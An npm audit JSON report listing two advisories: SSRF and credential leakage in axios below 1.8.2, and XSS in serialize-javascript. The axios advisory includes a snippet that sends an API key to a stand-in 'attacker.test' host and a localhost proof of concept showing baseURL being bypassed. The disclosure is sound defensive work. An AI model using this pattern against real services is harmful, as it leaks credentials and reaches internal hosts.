{"actions":[],"advisories":{"1102472":{"findings":[{"version":"1.7.7","paths":["axios"]}],"found_by":null,"deleted":null,"references":"- https://github.com/axios/axios/security/advisories/GHSA-jr5f-v2jv-69x6\n- https://github.com/axios/axios/issues/6463\n- https://github.com/axios/axios/commit/fb8eec214ce7744b5ca787f2c3b8339b2f54b00f\n- https://github.com/axios/axios/releases/tag/v1.8.2\n- https://nvd.nist.gov/vuln/detail/CVE-2025-27152\n- https://github.com/advisories/GHSA-jr5f-v2jv-69x6","created":"2025-03-07T15:16:00.000Z","id":1102472,"npm_advisory_id":null,"overview":"### Summary\n\nA previously reported issue in axios demonstrated that using protocol-relative URLs could lead to SSRF (Server-Side Request Forgery).\nReference: axios/axios#6463\n\nA similar problem that occurs when passing absolute URLs rather than protocol-relative URLs to axios has been identified. Even if ⁠`baseURL` is set, axios sends the request to the specified absolute URL, potentially causing SSRF and credential leakage. This issue impacts both server-side and client-side usage of axios.\n\n### Details\n\nConsider the following code snippet:\n\n```js\nimport axios from \"axios\";\n\nconst internalAPIClient = axios.create({\n  baseURL: \"http://example.test/api/v1/users/\",\n  headers: {\n    \"X-API-KEY\": \"1234567890\",\n  },\n});\n\n// const userId = \"123\";\nconst userId = \"http://attacker.test/\";\n\nawait internalAPIClient.get(userId); // SSRF\n```\n\nIn this example, the request is sent to `http://attacker.test/` instead of the `baseURL`. As a result, the domain owner of `attacker.test` would receive the `X-API-KEY` included in the request headers.\n\nIt is recommended that:\n\n-\tWhen `baseURL` is set, passing an absolute URL such as `http://attacker.test/` to `get()` should not ignore `baseURL`.\n-\tBefore sending the HTTP request (after combining the `baseURL` with the user-provided parameter), axios should verify that the resulting URL still begins with the expected `baseURL`.\n\n### PoC\n\nFollow the steps below to reproduce the issue:\n\n1.\tSet up two simple HTTP servers:\n\n```\nmkdir /tmp/server1 /tmp/server2\necho \"this is server1\" > /tmp/server1/index.html \necho \"this is server2\" > /tmp/server2/index.html\npython -m http.server -d /tmp/server1 10001 &\npython -m http.server -d /tmp/server2 10002 &\n```\n\n\n2.\tCreate a script (e.g., main.js):\n\n```js\nimport axios from \"axios\";\nconst client = axios.create({ baseURL: \"http://localhost:10001/\" });\nconst response = await client.get(\"http://localhost:10002/\");\nconsole.log(response.data);\n```\n\n3.\tRun the script:\n\n```\n$ node main.js\nthis is server2\n```\n\nEven though `baseURL` is set to `http://localhost:10001/`, axios sends the request to `http://localhost:10002/`.\n\n### Impact\n\n-\tCredential Leakage: Sensitive API keys or credentials (configured in axios) may be exposed to unintended third-party hosts if an absolute URL is passed.\n-\tSSRF (Server-Side Request Forgery): Attackers can send requests to other internal hosts on the network where the axios program is running.\n-\tAffected Users: Software that uses `baseURL` and does not validate path parameters is affected by this issue.","reported_by":null,"title":"axios Requests Vulnerable To Possible SSRF and Credential Leakage via Absolute URL","metadata":null,"cves":["CVE-2025-27152"],"access":"public","severity":"high","module_name":"axios","vulnerable_versions":"<1.8.2","github_advisory_id":"GHSA-jr5f-v2jv-69x6","recommendation":"Upgrade to version 1.8.2 or later","patched_versions":">=1.8.2","updated":"2025-03-07T19:16:41.000Z","cvss":{"score":0,"vectorString":null},"cwe":["CWE-918"],"url":"https://github.com/advisories/GHSA-jr5f-v2jv-69x6"},"1102832":{"findings":[{"version":"6.0.0","paths":["mocha>serialize-javascript","mocha-junit-reporter>mocha>serialize-javascript"]}],"found_by":null,"deleted":null,"references":"- https://nvd.nist.gov/vuln/detail/CVE-2024-11831\n- https://github.com/yahoo/serialize-javascript/pull/173\n- https://github.com/yahoo/serialize-javascript/commit/f27d65d3de42affe2aac14607066c293891cec4e\n- https://access.redhat.com/security/cve/CVE-2024-11831\n- https://bugzilla.redhat.com/show_bug.cgi?id=2312579\n- https://access.redhat.com/errata/RHSA-2025:1334\n- https://access.redhat.com/errata/RHSA-2025:1468\n- https://github.com/yahoo/serialize-javascript/commit/7f3ac252d86b802454cb43782820aea2e0f6dc25\n- https://github.com/advisories/GHSA-76p7-773f-r4q5","created":"2025-02-10T18:30:47.000Z","id":1102832,"npm_advisory_id":null,"overview":"A flaw was found in npm-serialize-javascript. The vulnerability occurs because the serialize-javascript module does not properly sanitize certain inputs, such as regex or other JavaScript object types, allowing an attacker to inject malicious code. This code could be executed when deserialized by a web browser, causing Cross-site scripting (XSS) attacks. This issue is critical in environments where serialized data is sent to web clients, potentially compromising the security of the website or web application using this package.","reported_by":null,"title":"Cross-site Scripting (XSS) in serialize-javascript","metadata":null,"cves":["CVE-2024-11831"],"access":"public","severity":"moderate","module_name":"serialize-javascript","vulnerable_versions":">=6.0.0 <6.0.2","github_advisory_id":"GHSA-76p7-773f-r4q5","recommendation":"Upgrade to version 6.0.2 or later","patched_versions":">=6.0.2","updated":"2025-02-21T20:19:18.000Z","cvss":{"score":5.4,"vectorString":"CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"},"cwe":["CWE-79"],"url":"https://github.com/advisories/GHSA-76p7-773f-r4q5"}},"muted":[],"metadata":{"vulnerabilities":{"info":0,"low":0,"moderate":2,"high":1,"critical":0},"dependencies":380,"devDependencies":0,"optionalDependencies":0,"totalDependencies":380}}
